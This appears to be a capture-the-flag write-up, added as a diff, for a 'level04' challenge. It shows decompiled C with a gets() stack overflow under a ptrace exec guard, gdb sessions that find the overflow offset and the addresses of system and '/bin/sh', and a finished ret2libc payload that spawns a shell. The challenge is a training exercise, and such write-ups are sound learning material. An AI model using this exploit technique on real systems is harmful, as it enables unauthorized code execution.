@@ -1,0 +1,78 @@
+int32_t main(int32_t argc, char** argv, char** envp)
+{
+    pid_t eax = fork();
+    char buf[128];
+    __builtin_memset(&buf, 0, 128);
+    int32_t var_18 = 0;
+    int32_t stat_loc = 0;
+    
+    if (eax)
+    {
+        while (true)
+        {
+            wait(&stat_loc);
+            
+            if (!(stat_loc & 127) || ((stat_loc & 127) + 1) >> 1 > 0)
+            {
+                puts("child is exiting...");
+                break;
+            }
+            
+            if (ptrace(PTRACE_PEEKUSER, eax, 44, 0) != 11)
+                continue;
+            
+            puts("no exec() for you");
+            kill(eax, 9);
+            break;
+        }
+    }
+    else
+    {
+        prctl(1, 1);
+        ptrace(PTRACE_TRACEME, 0, 0, 0);
+        puts("Give me some shellcode, k");
+        gets(&buf);
+    }
+    
+    return 0;
+}
+
+
+Reading symbols from /home/users/level04/level04...(no debugging symbols found)...done.
+(gdb) set follow-fork-mode child
+(gdb) run
+Starting program: /home/users/level04/level04 
+[New process 1818]
+Give me some shellcode, k
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
+Program received signal SIGSEGV, Segmentation fault.
+[Switching to process 1818]
+0x6261616f in ?? ()
+oaab = offset 156
+
+
+(gdb) b main
+Breakpoint 1 at 0x80486cd
+(gdb) run
+Starting program: /home/users/level04/level04 
+Breakpoint 1, 0x080486cd in main ()
+(gdb) print system
+$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+
+
+
+(gdb) find &system, +9999999, "/bin/sh"
+0xf7f897ec
+warning: Unable to access target memory at 0xf7fd3b74, halting search.
+1 pattern found.
+
+
+
+
+(
+printf 'A%.0s' {1..156}        
+printf '\xd0\xae\xe6\xf7'      
+printf 'RETS'                  
+printf '\xec\x97\xf8\xf7'  
+cat
+) | ./level04
